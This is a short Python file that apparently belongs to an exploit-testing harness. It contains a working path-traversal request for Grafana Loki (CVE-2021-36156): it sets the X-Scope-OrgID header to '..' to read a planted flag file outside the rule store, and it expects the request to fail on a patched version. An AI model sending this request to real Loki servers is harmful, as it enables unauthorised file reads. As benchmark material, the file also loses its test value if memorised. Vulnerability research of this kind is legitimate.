#!/usr/bin/env python3
"""ORIGINAL exploit for the CVE-2021-36156 lineage (GIVEN seed).

Grafana Loki's Ruler local rule store builds the on-disk path for a rule-group
listing as:

    filepath.Join(<ruler.storage.local.directory>, <tenant-id>, <namespace>)

where <tenant-id> is the X-Scope-OrgID request header. CVE-2021-36156 abuses the
TENANT-ID input: a traversal value such as ".." walks out of the rule-store
directory, and Loki reads/parses the file it lands on, echoing its contents in
the API response.

This candidate drives the ORIGINAL (tenant-id) vector:
    GET /loki/api/v1/rules/pcb_flag.yaml   with   X-Scope-OrgID: ..
      -> filepath.Join("/loki/rules-src", "..", "pcb_flag.yaml")
      -> "/loki/pcb_flag.yaml"   (the planted flag, one level above the store)

Expected differential:
    * reads the flag on V0 (grafana/loki:2.2.1, pre-fix)
    * BLOCKED on V1 (grafana/loki:3.6.3): the CVE-2021-36156 fix restricts path
      segments in tenant ids, so ".." is rejected ("no org id").
"""
from __future__ import annotations


def candidate():
    """Return the observable request for the original tenant-id traversal."""
    return {
        "method": "GET",
        "path": "/loki/api/v1/rules/pcb_flag.yaml",
        "headers": {"X-Scope-OrgID": ".."},
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
